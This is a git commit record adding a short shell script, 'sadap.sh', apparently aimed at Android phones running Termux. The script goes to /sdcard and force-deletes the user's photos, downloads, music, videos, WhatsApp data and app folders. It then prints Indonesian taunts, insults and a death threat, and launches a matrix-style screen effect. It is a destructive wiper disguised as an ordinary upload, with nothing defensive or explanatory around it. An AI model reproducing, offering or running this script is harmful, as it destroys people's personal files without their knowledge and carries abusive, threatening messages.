444ddfc2e7bc12fb0b7a22ead630091602c31fe7
hackday404 <54924067+hackday404@users.noreply.github.com>
2019-10-31 19:58:04 +0700

    Add files via upload

---
+++ sadap.sh
@@ -0,0 +1,17 @@
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "Mampus Semua File Lu Hilang"
+echo "TEAM HACKDAY TERSAKITI"
+echo "MEMBUNUH TANPA MENYENTUH"
+echo "Fuck You !!"
+echo "i will kill you"
+pkg install cmatrix
+cmatrix
